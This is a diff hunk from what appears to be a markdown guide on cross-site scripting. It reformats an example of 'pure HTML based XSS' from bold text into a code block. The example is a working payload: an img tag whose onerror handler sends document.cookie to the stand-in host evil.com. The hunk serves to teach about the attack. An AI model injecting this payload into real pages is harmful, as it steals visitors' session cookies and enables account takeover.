@@ -138,7 +138,7 @@ Example:
 
 ### ✅ Real-World Example: Pure HTML Based XSS (no <script>)
 
-**<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">**
+```<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">```
 
----
+
 
